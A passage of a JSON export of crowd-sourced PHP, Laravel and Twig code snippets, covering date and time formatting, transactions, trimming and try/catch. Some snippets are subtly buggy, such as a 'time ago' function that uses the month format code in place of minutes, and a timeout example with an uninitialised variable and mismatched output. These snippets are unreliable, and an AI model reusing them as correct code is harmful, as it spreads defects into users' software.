    "description": "public function convert_time_to_days($date) {        $current_date = date(\"Y-m-d H:m:s\");        $time = array();        $day = floor((strtotime($current_date) - strtotime($date)) / (60 * 60 * 24));          if ($day == 0) {            $hour = floor((strtotime($current_date) - strtotime($date)) / (60 * 60));              if ($hour == 0) {                $minute = floor((strtotime($current_date) - strtotime($date)) / (60));                $time = $minute . __d('course', \"minutes ago\");              } else {                $time = $hour . __d('course', \"hours ago\");            }               } else {            $time = $day . __d('course', \"days ago\");        }               return $time;    } \n<!DOCTYPE html> <html> <body>  <?php  function time_elapsed_string($datetime, $full = false) {     $now = new DateTime;     $ago = new DateTime($datetime);     $diff = $now->diff($ago);      $diff->w = floor($diff->d / 7);     $diff->d -= $diff->w * 7;      $string = array(         'y' => 'year',         'm' => 'month',         'w' => 'week',         'd' => 'day',         'h' => 'hour',         'i' => 'minute',         's' => 'second',     );     foreach ($string as $k => &$v) {         if ($diff->$k) {             $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');         } else {             unset($string[$k]);         }     }      if (!$full) $string = array_slice($string, 0, 1);     return $string ? implode(', ', $string) . ' ago' : 'just now'; }  echo time_elapsed_string(date(\"Y-m-d H:i:s\", 1621173863)); ?>  </body> </html>      echo time_elapsed_string('2013-05-01 00:22:35'); echo time_elapsed_string('@1367367755'); # timestamp input echo time_elapsed_string('2013-05-01 00:22:35', true);   Output :  4 months ago 4 months ago 4 months, 2 weeks, 3 days, 1 hour, 49 minutes, 15 seconds ago\n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4900,
    "keyword": null,
    "link": null,
    "title": " time in php",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\n//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \n//Get current date time in PHP  // Simply: $date = date('Y-m-d H:i:s');  // Or: $date = date('Y/m/d H:i:s');  // This would return the date in the following formats respectively: $date = '2012-03-06 17:33:07'; // Or $date = '2012/03/06 17:33:07';  /**   * This time is based on the default server time zone.  * If you want the date in a different time zone,  * say if you come from Nairobi, Kenya like I do, you can set  * the time zone to Nairobi as shown below.  */  date_default_timezone_set('Africa/Nairobi');  // Then call the date functions $date = date('Y-m-d H:i:s'); // Or $date = date('Y/m/d H:i:s');  // date_default_timezone_set() function is however // supported by PHP version 5.1.0 or above. \n// for a human time string like: \"It's around ten past twelve\"  // usage: echo 'It\\'s ' . humanTime(date('h'), date('i'));  function humanTime($hour, $min) {     $times = [         0 => '%s o\\'clock',         2 => 'a couple of mins past %s',         5 => 'five past %s',         8 => 'around ten past %s',         10 => 'ten past %s',         15 => 'quarter past %s',         20 => 'twenty past %s',         25 => 'twenty five past %s',         27 => 'around half past %s',         30 => 'half past %s',         33 => 'around thirty five past %s',         35 => 'thirty five past %s',         40 => 'twenty to %s',         43 => 'around quarter to %s',         45 => 'quarter to %s',         47 => 'about ten to %s',         50 => 'ten to %s',         53 => 'about five to %s',         55 => 'five to %s'     ];          $hourWord = [         'one',         'two',         'three',         'four',         'five',         'six',         'seven',         'eight',         'nine',         'ten',         'eleven',         'twelve'     ];      $hour = (int) $hour;     $min = (int) $min;          $closest = null;     foreach ($times as $key => $item)          if ($closest === null || abs($min - $closest) > abs($key - $min)) $closest = $key;          if ($hour === 0) $hour = 12;          if ($min > 40) $hour = $hour === 12 ? 1 : $hour + 1;      return sprintf($times[$closest], $hourWord[(int) $hour - 1]); }\n<?php  /* Unix Timestamp */ $timestamp = time(); echo $timestamp . \"<br>\"; echo date(\"d/m/Y\", $timestamp); ?>\necho date('d/m/Y h:i:s a');\t// 01/02/2020 01:01:30 am // d - The day of the month (from 01 to 31) // D - A textual representation of a day (three letters) // j - The day of the month without leading zeros (1 to 31) // l (lowercase 'L') - A full textual representation of a day // N - The ISO-8601 numeric representation of a day (1 for Monday, 7 for Sunday) // S - The English ordinal suffix for the day of the month (2 characters st, nd, rd or th. Works well with j) // w - A numeric representation of the day (0 for Sunday, 6 for Saturday) // z - The day of the year (from 0 through 365) // W - The ISO-8601 week number of year (weeks starting on Monday) // F - A full textual representation of a month (January through December) // m - A numeric representation of a month (from 01 to 12) // M - A short textual representation of a month (three letters) // n - A numeric representation of a month, without leading zeros (1 to 12) // t - The number of days in the given month // L - Whether it's a leap year (1 if it is a leap year, 0 otherwise) // o - The ISO-8601 year number // Y - A four digit representation of a year // y - A two digit representation of a year // a - Lowercase am or pm // A - Uppercase AM or PM // B - Swatch Internet time (000 to 999) // g - 12-hour format of an hour (1 to 12) // G - 24-hour format of an hour (0 to 23) // h - 12-hour format of an hour (01 to 12) // H - 24-hour format of an hour (00 to 23) // i - Minutes with leading zeros (00 to 59) // s - Seconds, with leading zeros (00 to 59) // u - Microseconds (added in PHP 5.2.2) // e - The timezone identifier (Examples: UTC, GMT, Atlantic/Azores) // I (capital i) - Whether the date is in daylights savings time (1 if Daylight Savings Time, 0 otherwise) // O - Difference to Greenwich time (GMT) in hours (Example: +0100) // P - Difference to Greenwich time (GMT) in hours:minutes (added in PHP 5.1.3) // T - Timezone abbreviations (Examples: EST, MDT) // Z - Timezone offset in seconds. The offset for timezones west of UTC is negative (-43200 to 50400) // c - The ISO-8601 date (e.g. 2013-05-05T16:34:42+00:00) // r - The RFC 2822 formatted date (e.g. Fri, 12 Apr 2013 12:01:05 +0200) // U - The seconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4901,
    "keyword": null,
    "link": null,
    "title": " time php",
    "description": "$today = date(\"F j, Y, g:i a\");   // October 30, 2019, 10:42 pm $today = date(\"D M j G:i:s T Y\"); // Wed Oct 30 22:42:18 UTC 2019 $today = date(\"Y-m-d H:i:s\");     // 2019-10-30 22:42:18(MySQL DATETIME format)\n//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \n$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n<?php  /* Unix Timestamp */ $timestamp = time(); echo $timestamp . \"<br>\"; echo date(\"d/m/Y\", $timestamp); ?>\necho date('d/m/Y h:i:s a');\t// 01/02/2020 01:01:30 am // d - The day of the month (from 01 to 31) // D - A textual representation of a day (three letters) // j - The day of the month without leading zeros (1 to 31) // l (lowercase 'L') - A full textual representation of a day // N - The ISO-8601 numeric representation of a day (1 for Monday, 7 for Sunday) // S - The English ordinal suffix for the day of the month (2 characters st, nd, rd or th. Works well with j) // w - A numeric representation of the day (0 for Sunday, 6 for Saturday) // z - The day of the year (from 0 through 365) // W - The ISO-8601 week number of year (weeks starting on Monday) // F - A full textual representation of a month (January through December) // m - A numeric representation of a month (from 01 to 12) // M - A short textual representation of a month (three letters) // n - A numeric representation of a month, without leading zeros (1 to 12) // t - The number of days in the given month // L - Whether it's a leap year (1 if it is a leap year, 0 otherwise) // o - The ISO-8601 year number // Y - A four digit representation of a year // y - A two digit representation of a year // a - Lowercase am or pm // A - Uppercase AM or PM // B - Swatch Internet time (000 to 999) // g - 12-hour format of an hour (1 to 12) // G - 24-hour format of an hour (0 to 23) // h - 12-hour format of an hour (01 to 12) // H - 24-hour format of an hour (00 to 23) // i - Minutes with leading zeros (00 to 59) // s - Seconds, with leading zeros (00 to 59) // u - Microseconds (added in PHP 5.2.2) // e - The timezone identifier (Examples: UTC, GMT, Atlantic/Azores) // I (capital i) - Whether the date is in daylights savings time (1 if Daylight Savings Time, 0 otherwise) // O - Difference to Greenwich time (GMT) in hours (Example: +0100) // P - Difference to Greenwich time (GMT) in hours:minutes (added in PHP 5.1.3) // T - Timezone abbreviations (Examples: EST, MDT) // Z - Timezone offset in seconds. The offset for timezones west of UTC is negative (-43200 to 50400) // c - The ISO-8601 date (e.g. 2013-05-05T16:34:42+00:00) // r - The RFC 2822 formatted date (e.g. Fri, 12 Apr 2013 12:01:05 +0200) // U - The seconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\n<?php $t=time(); echo($t . \"<br>\"); echo(date(\"Y-m-d\",$t)); ?>\n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4902,
    "keyword": null,
    "link": null,
    "title": " time to load php page",
    "description": "//Put this code at beginning of your page: <?php $start_time = microtime(true); ?>     //Put this code at the end of your page: This page was generated in <?php echo(number_format(microtime(true) - $start_time, 2)); ?> seconds.\n",
    "reg_date": "2021-10-12T10:20:36.000Z"
  },
  {
    "id": 4903,
    "keyword": null,
    "link": null,
    "title": " time to string in php",
    "description": " <?php $date = new DateTime('2000-01-01'); echo $date->format('Y-m-d H:i:s'); ?>  \n<?php $date = '27/06/2020, 04:42:43 PM'; $date = str_replace('/', '-', $date); echo date('F j, Y, g:i a',strtotime($date));  // output : June 27, 2020, 4:42 pm ?>\n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4904,
    "keyword": null,
    "link": null,
    "title": " time zone set in codeigniter",
    "description": "$config['time_reference'] = 'Asia/Kathmandu';\n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4905,
    "keyword": null,
    "link": null,
    "title": " timeout php",
    "description": "//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \n<?php  set_time_limit(20);  while ($i<=10) {         echo \"i=$i \";         sleep(100);         $i++; }  ?>  Output: i=0 i=1 i=2 i=3 i=4 i=5 i=6 i=7 i=8 i=9 i=10\n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4906,
    "keyword": null,
    "link": null,
    "title": " timestamp false in laravel",
    "description": "<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     public $timestamps = false;      // }\n<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     public $timestamps = false;      // } \n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4907,
    "keyword": null,
    "link": null,
    "title": " timestamp php",
    "description": " <?php $date = new DateTime(); echo $date->getTimestamp(); ?>  \nstrtotime(\"now\");  // strtotime is a function that will take a string parameter  // that specifies a date, and returns a unix time stamp bassed // on that  echo strtotime(\"2020-02-24\");  // prints: 1582502400\n<?php  echo time();  ?>\n<?php $t=time(); echo($t . \"<br>\"); echo(date(\"Y-m-d\",$t)); ?>\n <?php $date = date_create(); echo date_timestamp_get($date); ?>  \n <?php $nextWeek = time() + (7 * 24 * 60 * 60);                    // 7 days; 24 hours; 60 mins; 60 secs echo 'Now:       '. date('Y-m-d') .\"\\n\"; echo 'Next Week: '. date('Y-m-d', $nextWeek) .\"\\n\"; // or using strtotime(): echo 'Next Week: '. date('Y-m-d', strtotime('+1 week')) .\"\\n\"; ?>  \n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4908,
    "keyword": null,
    "link": null,
    "title": " tinker laravel tutorial",
    "description": "php artisan tinker    $user = new App\\User; $user->name = \"Wruce Bayne\"; $user->email = \"iambatman@savegotham.com\"; $user->save();\n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4909,
    "keyword": null,
    "link": null,
    "title": " tmp cakephp name",
    "description": "app/tmp/cache/models app/tmp/cache/persistent\n// two folder need in cakephp 2.* version tmp/cache/models tmp/cache/persistent\n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4910,
    "keyword": null,
    "link": null,
    "title": " to create a new observer class",
    "description": "php artisan make:observer UserObserver --model=User\n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4911,
    "keyword": null,
    "link": null,
    "title": " toarray php",
    "description": " <?php $collection = new \\Ds\\Vector([1, 2, 3]);  var_dump($collection->toArray()); ?>  \n",
    "reg_date": "2021-10-12T10:20:37.000Z"
  },
  {
    "id": 4912,
    "keyword": null,
    "link": null,
    "title": " token delete laravel",
    "description": "public function logout() {     Auth::user()->tokens->each(function($token, $key) {         $token->delete();     });      return response()->json('Successfully logged out'); }\n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4913,
    "keyword": null,
    "link": null,
    "title": " tolower php",
    "description": "/* strtolower() function converts  string to lowercase. */ <?php echo strtolower(\"Hello WORLD 123\"); ?> // Output:hello world 123\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world' $string = 'HeLlO WoRlD'; echo strtolower($string); //Output: 'hello world'\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world'\n/* The strtolower() function converts a string to lowercase. Convert all characters to lowercase.*/ <?php echo strtolower(\"Hello WORLD.\"); ?> // Output: hello world.\nThe strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\nstrtolower ( string $string ) : string  //Returns string with all alphabetic characters converted to lowercase. $string = 'HELLO WORLD'; echo strtolower($string); //Output: 'hello world' The strtolower() function is used to convert a string into lowercase. This function takes a string as parameter and converts all the uppercase english alphabets present in the string to lowercase.\n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4914,
    "keyword": null,
    "link": null,
    "title": " tomorro date php",
    "description": "$tomorrow = date(\"Y-m-d\", strtotime('tomorrow')); or  $tomorrow = date(\"Y-m-d\", strtotime(\"+1 day\"));  for DateTime    $datetime = new DateTime('tomorrow'); echo $datetime->format('Y-m-d H:i:s');  or  $datetime = new DateTime('2013-01-22'); $datetime->modify('+1 day'); echo $datetime->format('Y-m-d H:i:s'); \n$tomorrow = date(\"Y-m-d\", strtotime('tomorrow')); or  $tomorrow = date(\"Y-m-d\", strtotime(\"+1 day\"));  for DateTime    $datetime = new DateTime('tomorrow'); echo $datetime->format('Y-m-d H:i:s');  or  $datetime = new DateTime('2013-01-22'); $datetime->modify('+1 day'); echo $datetime->format('Y-m-d H:i:s');\n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4915,
    "keyword": null,
    "link": null,
    "title": " tomorrow date php",
    "description": "$tomorrow = date(\"Y-m-d\", strtotime('tomorrow')); or  $tomorrow = date(\"Y-m-d\", strtotime(\"+1 day\"));  for DateTime    $datetime = new DateTime('tomorrow'); echo $datetime->format('Y-m-d H:i:s');  or  $datetime = new DateTime('2013-01-22'); $datetime->modify('+1 day'); echo $datetime->format('Y-m-d H:i:s'); \n$tomorrow = date(\"Y-m-d\", strtotime('tomorrow')); or  $tomorrow = date(\"Y-m-d\", strtotime(\"+1 day\"));  for DateTime    $datetime = new DateTime('tomorrow'); echo $datetime->format('Y-m-d H:i:s');  or  $datetime = new DateTime('2013-01-22'); $datetime->modify('+1 day'); echo $datetime->format('Y-m-d H:i:s');\n$tomorrow = new DateTime('tomorrow'); echo $tomorrow->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4916,
    "keyword": null,
    "link": null,
    "title": " total no of occurances in string php",
    "description": "$str = \"cdcdcdcdeeeef\"; echo substr_count($str, 'c');    //please note needle is case sensitive\n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4917,
    "keyword": null,
    "link": null,
    "title": " transaction commit rollback in laravel",
    "description": "DB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong }\n// try...catch try {     // Transaction     $exception = DB::transaction(function() {          // Do your SQL here      });      if(is_null($exception)) {         return true;     } else {         throw new Exception;     }  } catch(Exception $e) {     return false; } \n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4918,
    "keyword": null,
    "link": null,
    "title": " transaction in laravel",
    "description": "DB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong }\nuse Illuminate\\Support\\Facades\\DB;  DB::transaction(function () {     DB::update('update users set votes = 1');      DB::delete('delete from posts'); });\n// try...catch try {     // Transaction     $exception = DB::transaction(function() {          // Do your SQL here      });      if(is_null($exception)) {         return true;     } else {         throw new Exception;     }  } catch(Exception $e) {     return false; } \nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\nDB::beginTransaction(); try { /** Statement */   DB::commit(); }  catch (\\Exception $e) { /** Statement if failed */ DB::rollback(); }\nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Exception $e) {     DB::rollback();     throw $e; } catch (\\Throwable $e) {     DB::rollback();     throw $e; } \n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4919,
    "keyword": null,
    "link": null,
    "title": " transaction laravel",
    "description": "DB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong }\nuse Illuminate\\Support\\Facades\\DB;  DB::transaction(function () {     DB::update('update users set votes = 1');      DB::delete('delete from posts'); });\n// try...catch try {     // Transaction     $exception = DB::transaction(function() {          // Do your SQL here      });      if(is_null($exception)) {         return true;     } else {         throw new Exception;     }  } catch(Exception $e) {     return false; } \nDB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong } \nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\nDB::beginTransaction(); try { /** Statement */   DB::commit(); }  catch (\\Exception $e) { /** Statement if failed */ DB::rollback(); }\n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4920,
    "keyword": null,
    "link": null,
    "title": " transfer file using file get content",
    "description": "file_get_contents('http://url/to/upload/handler', false, $context);\n$filename = \"/path/to/uploaded/file.zip\"; $file_contents = file_get_contents($filename);      $content =  \"--\".MULTIPART_BOUNDARY.\"\\r\\n\".             \"Content-Disposition: form-data; name=\\\"\".FORM_FIELD.\"\\\"; filename=\\\"\".basename($filename).\"\\\"\\r\\n\".             \"Content-Type: application/zip\\r\\n\\r\\n\".             $file_contents.\"\\r\\n\";  // add some POST fields to the request too: $_POST['foo'] = 'bar' $content .= \"--\".MULTIPART_BOUNDARY.\"\\r\\n\".             \"Content-Disposition: form-data; name=\\\"foo\\\"\\r\\n\\r\\n\".             \"bar\\r\\n\";  // signal end of request (note the trailing \"--\") $content .= \"--\".MULTIPART_BOUNDARY.\"--\\r\\n\";\n$header = 'Content-Type: multipart/form-data; boundary='.MULTIPART_BOUNDARY;\n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4921,
    "keyword": null,
    "link": null,
    "title": " transforming string to integer in php",
    "description": "intval($string);\nUsing intval() and floatval() Function. The intval() and floatval() functions can also be used to convert the string into its corresponding integer and float values respectively. echo floatval ( $num );\n",
    "reg_date": "2021-10-12T10:20:38.000Z"
  },
  {
    "id": 4922,
    "keyword": null,
    "link": null,
    "title": " trim array in map php",
    "description": "$trimmed_array = array_map('trim', $fruit); print_r($trimmed_array);\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4923,
    "keyword": null,
    "link": null,
    "title": " trim comma from variable in php",
    "description": "rtrim($my_string,',');\npreg_replace('/^([^,]*).*$/', '$1', $print); substr($string, 0, strrpos($string.\",\", \",\"));\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4924,
    "keyword": null,
    "link": null,
    "title": " trim elements of array php",
    "description": "$result = array_map('trim', $source_array);\n$arr = array( \" John \", \"Jacob \", \" Tom \", \" Tim \"); $result = array_map('trim', $arr)\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4925,
    "keyword": null,
    "link": null,
    "title": " trim function php",
    "description": "/* Removes whitespace from beginning and end of a string if * the second parameter is omitted * First parameter must be the string * Second parameter is optional and can include an alternative character or set of characters. */  // Example 1 $string = \" Hello world \"; $trimmedString = trim($string); // Output = 'Hello world',  // Example 2 $string = \"babcabcHello worldabbaca\"; $trimmedString = trim($string, 'abc'); // Output = 'Hello world',\n<?php  $text   = \"\\t\\tThese are a few words :) ...  \"; $binary = \"\\x09Example string\\x0A\"; $hello  = \"Hello World\"; var_dump($text, $binary, $hello);  print \"\\n\";  $trimmed = trim($text); var_dump($trimmed);  $trimmed = trim($text, \" \\t.\"); var_dump($trimmed);  $trimmed = trim($hello, \"Hdle\"); var_dump($trimmed);  $trimmed = trim($hello, 'HdWr'); var_dump($trimmed);  // trim the ASCII control characters at the beginning and end of $binary // (from 0 to 31 inclusive) $clean = trim($binary, \"\\x00..\\x1F\"); var_dump($clean);  ?>\n$text = \"      hello world   \"; $text = trim($text);  => \"hello world\"\nRemoves whitespace from beginning and end of a string\n$DATA=trim(\"abc|1|test|\",\"|\");\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4926,
    "keyword": null,
    "link": null,
    "title": " trim specific character from strin using php",
    "description": "$widget_id = trim($widget_text,'[]') \n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4927,
    "keyword": null,
    "link": null,
    "title": " true false php",
    "description": "\"\"         -> false \"0\"        -> false \"0.0\"      -> true \"1\"        -> true \"01\"       -> true \"abc\"      -> true \"true\"     -> true \"false\"    -> true \"null\"     -> true 0          -> false 0.1        -> true 1          -> true 1.1        -> true -42        -> true \"NAN\"      -> true 0          -> false NAN        -> true null       -> false true       -> true false      -> false []         -> false [\"\"]       -> true [\"0\"]      -> true [0]        -> true [null]     -> true [\"a\"]      -> true {}         -> true {}         -> true {\"t\":\"s\"}  -> true {\"c\":null} -> true \n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4928,
    "keyword": null,
    "link": null,
    "title": " truncate table laravel eloquent",
    "description": "MyModel::truncate();\nVisitor::query()->truncate();\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4929,
    "keyword": null,
    "link": null,
    "title": " try and catch laravel",
    "description": "try {    $this->buildXMLHeader();  } catch (\\Exception $e) {      return $e->getMessage(); }\npublic function isValid($value) {     try {         // Validate the value...     } catch (Throwable $e) {         report($e);          return false;     } }\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4930,
    "keyword": null,
    "link": null,
    "title": " try catch in php",
    "description": "function inverse($x) {     if (!$x) {         throw new Exception('Division by zero.');     }     return 1/$x; }\nfunction inverso($x) {     if (!$x) {         throw new Exception('Zero division.');     }     return 1/$x; }  try {     echo inverso(5) . \"\\n\";     echo inverso(0) . \"\\n\"; } catch (Exception $e) {     echo 'and the error is: ',  $e->getMessage(), \"\\n\"; }\n <?php  function test() {     try {         throw new Exception('foo');     } catch (Exception $e) {         return 'catch';     } finally {         return 'finally';     } }  echo test(); ?>  \n <?php function inverse($x) {     if (!$x) {        throw new Exception('Division durch Null.');     }     return 1/$x; }  try {     echo inverse(5) . \"\\n\";     echo inverse(0) . \"\\n\"; } catch (Exception $e) {     echo 'Exception abgefangen: ',  $e->getMessage(), \"\\n\"; }  // Ausf&uuml;hrung fortsetzen echo \"Hallo Welt\\n\"; ?>  \nTry catch comes under exception handeling concept where using this we control the runtime error and modify the message as we want.  // function created with exception throw function checkdata($number){ \tif($number > 10){     \tthrow new Exception(\"Number is greater than 10\");     }     return true; }  // try block starts try{ \tcheckdata(15);   \techo \"The number is below 10\"; } // catch block catch(Exception $e){ \techo \"Message :\".$e->getMessage(); }  In above code if condition is not satisfied then it will throw exception and which gets caught by catch block and show the error message. \ntry { } catch(Exception $e) { }\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4931,
    "keyword": null,
    "link": null,
    "title": " try catch php",
    "description": "function inverse($x) {     if (!$x) {         throw new Exception('Division by zero.');     }     return 1/$x; }\nfunction inverso($x) {     if (!$x) {         throw new Exception('Zero division.');     }     return 1/$x; }  try {     echo inverso(5) . \"\\n\";     echo inverso(0) . \"\\n\"; } catch (Exception $e) {     echo 'and the error is: ',  $e->getMessage(), \"\\n\"; }\n <?php  function test() {     try {         throw new Exception('foo');     } catch (Exception $e) {         return 'catch';     } finally {         return 'finally';     } }  echo test(); ?>  \n <?php function inverse($x) {     if (!$x) {        throw new Exception('Division durch Null.');     }     return 1/$x; }  try {     echo inverse(5) . \"\\n\";     echo inverse(0) . \"\\n\"; } catch (Exception $e) {     echo 'Exception abgefangen: ',  $e->getMessage(), \"\\n\"; }  // Ausf&uuml;hrung fortsetzen echo \"Hallo Welt\\n\"; ?>  \nTry catch comes under exception handeling concept where using this we control the runtime error and modify the message as we want.  // function created with exception throw function checkdata($number){ \tif($number > 10){     \tthrow new Exception(\"Number is greater than 10\");     }     return true; }  // try block starts try{ \tcheckdata(15);   \techo \"The number is below 10\"; } // catch block catch(Exception $e){ \techo \"Message :\".$e->getMessage(); }  In above code if condition is not satisfied then it will throw exception and which gets caught by catch block and show the error message. \ntry { } catch(Exception $e) { }\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4932,
    "keyword": null,
    "link": null,
    "title": " trying to get property 'id' of non object in laravel api",
    "description": " $request->user()->id or Auth::user()->id or $request[\"user\"][\"id\"]\n",
    "reg_date": "2021-10-12T10:20:39.000Z"
  },
  {
    "id": 4933,
    "keyword": null,
    "link": null,
    "title": " turn off deprecated warnings php",
    "description": "error_reporting(E_ALL ^ E_DEPRECATED);\nerror_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4934,
    "keyword": null,
    "link": null,
    "title": " turn text file to string php",
    "description": "file_get_contents('http://url/to/upload/handler', false, $context);\n$fileContent = file_get_contents($url);\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4935,
    "keyword": null,
    "link": null,
    "title": " twig concat string",
    "description": "{{ 'http://' ~ app.request.host }}  // To add a filter - like 'trans' - in the same tag use {{ ('http://' ~ app.request.host) | trans }}  // You can also use string interpolation, this does require double quoted strings: {{ \"http://#{app.request.host}\" }}\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4936,
    "keyword": null,
    "link": null,
    "title": " twig first letter uppercase",
    "description": "use Illuminate\\Support\\Str;  ...  $string = Str::ucfirst('foo bar');\n{{ post.author.name | capitalize }}\n{{ 'welcome'|upper }}  {# outputs 'WELCOME' #}\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4937,
    "keyword": null,
    "link": null,
    "title": " twig for",
    "description": "<ul>     {% for key, user in users %}         <li>{{ key }}: {{ user.username|e }}</li>     {% endfor %} </ul>\n{% for i in 0..10 %}     * {{ i }} {% endfor %} \n{% for user in users %}     {{ loop.index }} - {{ user.username }} {% endfor %} \n{% for i in 0..10 %}     * {{ i }} {% endfor %}\n{% for letter in 'a'..'z' %}     * {{ letter }} {% endfor %} \n<?php // menu.php // inclure  l'autoloader include 'vendor/autoload.php';  try {     // le dossier ou on trouve les templates     $loader = new Twig\\Loader\\FilesystemLoader('templates');      // initialiser l'environement Twig     $twig = new Twig\\Environment($loader);      // load template     $template = $twig->load('Menu.html');      // set template variables     // render template     echo $template->render(array(         'lundi' => 'Steak Frites',         'mardi' => 'Raviolis',         'mercredi' => 'Pot au Feu',         'jeudi' => 'Couscous',         'vendredi' => 'Poisson',     ));  } catch (Exception $e) {     die ('ERROR: ' . $e->getMessage()); } \n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4938,
    "keyword": null,
    "link": null,
    "title": " twig get array key name",
    "description": "{% for key, value in array %}     {{ key }} - {{ value }} {% endfor %}\n",
    "reg_date": "2021-10-12T10:20:40.000Z"
  },
  {
    "id": 4939,
    "keyword": null,
    "link": null,
    "title": " twig if else",
